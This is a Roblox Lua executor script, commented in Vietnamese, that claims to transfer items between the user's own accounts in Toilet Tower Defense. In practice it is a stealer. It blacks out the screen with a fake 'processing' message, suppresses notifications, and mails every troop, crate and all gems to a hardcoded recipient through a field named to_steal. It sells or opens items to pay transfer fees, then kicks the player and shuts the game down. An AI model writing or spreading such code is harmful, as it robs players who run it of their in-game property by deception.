--[[
    Tên script: Auto Send All Items + Gems (Toilet Tower Defense)
    Tính năng:
        - Tự động làm đen màn hình, hiển thị "Đang xử lý..."
        - Gửi toàn bộ troops, crates và gems về tài khoản chỉ định
        - Tự động mở crate và bán linh tinh nếu thiếu coins để gửi
        - Sau khi hoàn tất: tự động kick khỏi game (để đổi acc nhanh)
    Cách dùng: Sửa tên người nhận ở dưới, copy code vào executor, chạy.
--]]

local targetUsername = "sogrrzd"  -- 👈 ĐỔI THÀNH TÊN TÀI KHOẢN NHẬN ĐỒ

-- ========== KIỂM TRA GAME ==========
local placeId = game.PlaceId
if placeId ~= 13775256536 then
    warn("❌ Script này chỉ dành cho Toilet Tower Defense!")
    return
end

-- ========== TẠO MÀN HÌNH ĐEN + LOADING ==========
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Xóa GUI cũ nếu tồn tại
local oldGui = playerGui:FindFirstChild("AutoSendLoader")
if oldGui then oldGui:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoSendLoader"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local blackFrame = Instance.new("Frame")
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blackFrame.BackgroundTransparency = 0
blackFrame.Parent = screenGui

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(0, 300, 0, 50)
loadingText.Position = UDim2.new(0.5, -150, 0.5, -25)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.TextSize = 20
loadingText.Font = Enum.Font.SourceSansBold
loadingText.Text = "ĐANG XỬ LÝ, VUI LÒNG CHỜ..."
loadingText.Parent = blackFrame

-- ========== LOGIC CHÍNH (dựa trên code gốc) ==========
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local MultiboxFramework = require(ReplicatedStorage:WaitForChild("MultiboxFramework"))
local NetworkingContainer = ReplicatedStorage:WaitForChild("NetworkingContainer")
local InventoryModule = MultiboxFramework:WaitForModule("Inventory")
local NetworkModule = MultiboxFramework:WaitForModule("Network")

local AllExistData = InventoryModule.GetAllExistData()
local DataRemote = NetworkingContainer:WaitForChild("DataRemote")
local SendMail = NetworkModule.CreateFunc("PostOffice_SendGift").sID
local SellTroops = NetworkModule.CreateEvent("SellTroops").ID
local OpenCrate = NetworkModule.CreateEvent("OpenCrates").ID

-- Người nhận
local receiverUserId = Players:GetUserIdFromNameAsync(targetUsername)
local mailMessage = "gg/noprofit"

-- Ẩn thông báo trong game (tránh làm phiền)
pcall(function()
    LocalPlayer.PlayerGui.MainFrames.Notifications.Visible = false
end)

-- Hàm lấy dữ liệu local player
local function GetLocalPlayerData()
    local upvalues = debug.getupvalues(InventoryModule.GetOwnedUIDs)
    return upvalues[1].GetLocalPlayerData()
end

-- Hàm lấy inventory items (troops + crates)
local function GetInventoryItems()
    return GetLocalPlayerData().InventoryItems
end

-- Tạo danh sách các item có thể gửi (sắp xếp theo giá trị tăng dần)
local function GetHits()
    local sorted = {}
    local inventory = GetInventoryItems()
    -- Troops
    for troopType, troopData in pairs(inventory.Troops) do
        if troopData and troopType ~= "Speakerman" then
            for uid, details in pairs(troopData) do
                if uid then
                    local exists = AllExistData.Troops[troopType .. (details.SH and "-Shiny" or "")]
                    table.insert(sorted, {
                        UID = uid,
                        Exists = exists,
                        to_steal = receiverUserId,
                        Name = troopType,
                        Class = "Troops"
                    })
                end
            end
        end
    end
    -- Crates
    for crateType, crateData in pairs(inventory.Crates) do
        for uid, _ in pairs(crateData) do
            if uid then
                local exists = AllExistData.Crates[crateType]
                table.insert(sorted, {
                    UID = uid,
                    Exists = exists,
                    to_steal = receiverUserId,
                    Name = crateType,
                    Class = "Crates"
                })
            end
        end
    end
    table.sort(sorted, function(a,b) return a.Exists < b.Exists end)
    return sorted
end

-- Kiểm tra item còn tồn tại không
local function IsUnitExists(uid)
    for _, item in pairs(GetHits()) do
        if item.UID == uid then return true end
    end
    return false
end

-- Mở crate
local function OpenCrate(uid)
    local args = { [1] = { [1] = { [1] = OpenCrate, [2] = uid, [3] = 1 } } }
    repeat
        DataRemote:FireServer(unpack(args))
        task.wait(0.25)
    until not IsUnitExists(uid)
end

-- Bán unit (troop)
local function SellUnit()
    repeat
        local units = GetHits()
        if #units == 0 then break end
        local target = units[#units]  -- bán unit có giá trị cao nhất để lấy coins
        -- Nếu là crate thì mở thay vì bán
        if target.Class == "Crates" then
            OpenCrate(target.UID)
            return true
        end
        local args = { [1] = { [1] = { [1] = SellTroops, [2] = { target.UID } } } }
        DataRemote:FireServer(unpack(args))
        task.wait(0.25)
    until #GetHits() == 0 or not IsUnitExists(target.UID)
end

-- Gửi unit kèm toàn bộ gems hiện có
local function SendUnit(uid, unitClass)
    local name = ""
    for _, item in pairs(GetHits()) do
        if item.UID == uid then
            name = item.Name
            break
        end
    end
    local diamonds = GetLocalPlayerData().Currencies.Gems
    local payload = {
        [1] = {
            [1] = {
                [1] = SendMail,
                [2] = 1234518324781,
                [3] = receiverUserId,
                [4] = unitClass,
                [5] = uid,
                [6] = diamonds,
                [7] = mailMessage
            }
        }
    }
    DataRemote:FireServer(unpack(payload))
    task.wait(0.25)
    -- Nếu vẫn còn thì gửi lại (đề phòng fail)
    if IsUnitExists(uid) then
        SendUnit(uid, unitClass)
    end
    print(string.format("[✓] Đã gửi %s (%s) cùng %s gems đến %s", name, unitClass, diamonds, targetUsername))
end

-- Mở tất cả crate và bán unit để lấy coins
local function OpenAllCratesAndSell()
    local hits = GetHits()
    for _, item in pairs(hits) do
        if item.Class == "Crates" then
            OpenCrate(item.UID)
        end
    end
    repeat
        SellUnit()
        local newHits = GetHits()
        if #newHits == 0 then break end
        local last = newHits[#newHits]
    until #GetHits() == 0 or (GetHits()[1] and GetHits()[1].Exists > 1000000)
end

-- Đếm số crate còn lại
local function CountCrates()
    local count = 0
    for _, item in pairs(GetHits()) do
        if item.Class == "Crates" then count = count + 1 end
    end
    return count
end

-- ========== VÒNG LẶP CHÍNH (GỬI HẾT ĐỒ) ==========
task.spawn(function()
    -- Kiểm tra nếu không có gì để gửi
    local initialHits = GetHits()
    if #initialHits == 0 then
        loadingText.Text = "Không có đồ để gửi! Thoát sau 2s..."
        task.wait(2)
        LocalPlayer:Kick("✅ Đã hoàn tất (không có đồ).")
        return
    end

    loadingText.Text = "Đang gửi đồ, vui lòng chờ..."
    
    while true do
        local currentHits = GetHits()
        if #currentHits == 0 then break end
        
        -- Lấy item rẻ nhất (để gửi trước)
        local best = currentHits[1]
        local playerData = GetLocalPlayerData()
        local coins = playerData.Currencies.Coins
        local gems = playerData.Currencies.Gems
        
        -- Nếu có đủ coins (>=100) thì gửi item
        if coins >= 100 then
            SendUnit(best.UID, best.Class)
        else
            -- Không đủ coins, cần bán hoặc mở crate để có coins
            if CountCrates() > 0 then
                OpenAllCratesAndSell()
            else
                SellUnit()  -- bán một unit để lấy coins
            end
        end
        task.wait(0.1)
    end
    
    -- Sau khi gửi hết đồ, gems cũng đã được gửi theo các lần gửi cuối
    loadingText.Text = "Hoàn tất! Thoát game..."
    task.wait(1)
    
    -- Tự động kick khỏi game
    pcall(function()
        LocalPlayer:Kick("✅ Đã gửi toàn bộ đồ và gems đến " .. targetUsername .. "! Hãy đổi acc.")
    end)
    game:Shutdown()
end)
